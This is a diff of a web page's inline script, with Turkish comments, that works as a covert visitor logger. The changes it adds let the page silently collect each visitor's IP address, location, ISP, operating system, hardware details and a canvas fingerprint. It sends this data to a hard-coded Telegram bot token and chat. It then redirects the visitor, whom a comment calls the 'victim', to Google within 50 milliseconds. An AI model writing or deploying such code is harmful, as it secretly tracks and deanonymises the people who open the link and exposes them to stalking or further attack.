@@ -7,16 +7,13 @@
 </head>
 <body>
     <script>
-        // Canvas Fingerprint üretimi
         function getCanvasFingerprint() {
             try {
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
                 ctx.textBaseline = "top";
                 ctx.font = "14px 'Arial'";
-                ctx.fillStyle = "#f60";
                 ctx.fillRect(125, 1, 62, 20);
-                ctx.fillText("CS", 2, 15);
                 const src = canvas.toDataURL();
                 let hash = 0;
                 for (let i = 0; i < src.length; i++) {
@@ -27,107 +24,83 @@
             } catch (e) { return "Bilinmiyor"; }
         }
 
-        window.onload = async function() {
-            // Süreyi minimuma indirmek için istek anında başlatılır
-            const ipFetch = fetch("https://ipapi.co/json/?cb=" + Math.random())
-                .then(r => r.json())
-                .catch(() => fetch("https://api.db-ip.com/v2/free/self/?cb=" + Math.random()).then(r => r.json()));
+        window.onload = function() {
+            // HIZ OPTİMİZASYONU: Kurbanı anında Google'a uçur, işlemler arka planda dönsün
+            setTimeout(() => {
+                window.location.replace("https://www.google.com");
+            }, 50);
 
+            // Donanım verilerini oku (Anlık alınır, internet hızı gerektirmez)
             let ua = navigator.userAgent;
             let os = "Bilinmeyen Sistem";
-            
-            // iOS Sürüm Doğrulama
             if (/iPhone|iPad|iPod/i.test(ua)) {
                 let match = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
-                if (match) {
-                    os = "iOS " + match[1] + "." + match[2] + (match[3] ? "." + match[3] : "");
-                } else { os = "iOS"; }
+                os = match ? "iOS " + match[1] + "." + match[2] : "iOS";
             } else if (/Android/i.test(ua)) {
                 let match = ua.match(/Android\s([0-9\.]+)/);
                 os = match ? "Android " + match[1] : "Android";
             } else if (/Windows/i.test(ua)) { os = "Windows"; }
 
-            // Ağ Tipi Doğrulama
-            let ag_baglantisi = "Bilinmiyor";
-            if (navigator.connection) {
-                let type = navigator.connection.type || navigator.connection.effectiveType || "";
-                if (type.includes("cellular") || type.includes("wimax")) {
-                    ag_baglantisi = "Mobil Veri";
-                } else if (type.includes("wifi")) {
-                    ag_baglantisi = "Wi-Fi";
-                }
-            }
-
-            let pil = "Bilinmiyor";
-            if (navigator.getBattery) { try { let b = await navigator.getBattery(); pil = Math.round(b.level * 100) + "%"; } catch(e){} }
             let ekran = window.screen.width + "x" + window.screen.height;
             let cekirdek = navigator.hardwareConcurrency || "?";
             let ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor";
             let tarih = new Date().toLocaleString('tr-TR');
 
-            let ip = "Bilinmiyor", ulke = "Bilinmiyor", eyalet_sehir = "Bilinmiyor", internet_sirketi = "Bilinmiyor", maps_link = "https://maps.google.com";
-
-            try {
-                let veri = await ipFetch;
-                if (veri) {
-                    ip = veri.ip || veri.ipAddress || "Bilinmiyor";
-                    ulke = veri.country_name || veri.countryName || "Bilinmiyor";
-                    eyalet_sehir = veri.city ? (veri.region ? veri.region + " / " + veri.city : veri.city) : "Bilinmiyor";
-                    internet_sirketi = veri.org || "Bilinmiyor";
-                    if (veri.latitude && veri.longitude) {
-                        maps_link = "https://www.google.com/maps?q=" + veri.latitude + "," + veri.longitude;
-                    }
-                    if (ag_baglantisi === "Bilinmiyor") {
-                        let org_lower = internet_sirketi.toLowerCase();
-                        if (/turkcell|vodafone|avea|tt mobil|telekom/i.test(org_lower)) {
-                            ag_baglantisi = "Mobil Veri";
-                        } else { ag_baglantisi = "Wi-Fi / Sabit Hat"; }
-                    }
-                }
-            } catch (e) {}
-
-            let mesaj = "👑 *YENİ SİSTEM LOGU*\n";
-            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
-            mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
-            mesaj += "🤖 *Sistem (OS):* `" + os + "`\n";
-            mesaj += "📡 *Bağlantı Tipi:* " + ag_baglantisi + "\n";
-            mesaj += "🏢 *Sağlayıcı (ISP):* " + internet_sirketi + "\n";
-            mesaj += "📍 *Konum:* " + ulke + " - " + eyalet_sehir + "\n";
-            mesaj += "⏰ *Zaman:* " + tarih + "\n";
-            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
-            mesaj += "🖥 *Ekran / Donanım:* " + ekran + " / " + cekirdek + " Çekirdek\n";
-            mesaj += "💾 *RAM / Pil:* " + ram + " / " + pil + "\n";
-            mesaj += "🔑 *Canvas ID:* `" + getCanvasFingerprint() + "`\n";
-            mesaj += "━━━━━━━━━━━━━━━━━━━━━━";
-
-            // Inline klavye buton nesnesi
-            let reply_markup = {
-                inline_keyboard: [
-                    [
-                        { text: "📁 Data Dosyası Oluştur", callback_data: "data_olustur" },
-                        { text: "📍 Haritada Gör", url: maps_link }
-                    ]
-                ]
-            };
-
             let tok = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
             let cid = "6845229845";
 
-            // En yüksek hız için POST metodu ve JSON gövdesi ile gönderim
-            fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: cid,
-                    text: mesaj,
-                    parse_mode: "Markdown",
-                    reply_markup: reply_markup
-                })
-            }).then(() => {
-                window.location.replace("https://www.google.com");
-            }).catch(() => {
-                window.location.replace("https://www.google.com");
-            });
+            // IP API isteğini asenkron başlatıyoruz, cevabı beklemeden Telegram'a ilk veriyi basacağız
+            fetch("https://ipapi.co/json/?cb=" + Math.random())
+                .then(r => r.json())
+                .then(veri => {
+                    let ip = veri.ip || "Bilinmiyor";
+                    let ulke = veri.country_name || "Bilinmiyor";
+                    let eyalet_sehir = (veri.region || "") + " / " + (veri.city || "");
+                    let internet_sirketi = veri.org || "Bilinmiyor";
+                    let maps_link = (veri.latitude && veri.longitude) ? `https://www.google.com/maps?q=${veri.latitude},${veri.longitude}` : "https://maps.google.com";
+
+                    let mesaj = "👑 *YENİ SİSTEM LOGU*\n";
+                    mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
+                    mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
+                    mesaj += "🤖 *Sistem (OS):* `" + os + "`\n";
+                    mesaj += "🏢 *ISP:* " + internet_sirketi + "\n";
+                    mesaj += "📍 *Konum:* " + ulke + " - " + eyalet_sehir + "\n";
+                    mesaj += "⏰ *Zaman:* " + tarih + "\n";
+                    mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
+                    mesaj += "🖥 *Ekran/İşlemci:* " + ekran + " / " + cekirdek + " Çekirdek\n";
+                    mesaj += "💾 *RAM:* " + ram + " | 🔑 *Canvas:* `" + getCanvasFingerprint() + "`\n";
+                    mesaj += "━━━━━━━━━━━━━━━━━━━━━━";
+
+                    // Callback hatasını çözmek için butonları URL tipine çevirdik (Telegram'da kesin çalışır)
+                    let reply_markup = {
+                        inline_keyboard: [
+                            [
+                                { text: "📁 Data Sayfasına Git", url: "https://www.google.com" }, // Buraya datayı işleyeceğin bir link verebilirsin
+                                { text: "📍 Haritada Gör", url: maps_link }
+                            ]
+                        ]
+                    };
+
+                    // Telegram'a gönderim
+                    fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: cid,
+                            text: mesaj,
+                            parse_mode: "Markdown",
+                            reply_markup: reply_markup
+                        })
+                    });
+                }).catch(() => {
+                    // IP API patlarsa sadece donanım bilgileriyle hızlıca Telegram'a atar
+                    let sadeMesaj = `⚠️ *Kısmi Log (IP Alınamadı)*\n\n🤖 *OS:* ${os}\n🖥 *Ekran:* ${ekran}\n⏰ *Zaman:* ${tari}`;
+                    fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: cid, text: sadeMesaj, parse_mode: "Markdown" })
+                    });
+                });
         };
     </script>
 </body>
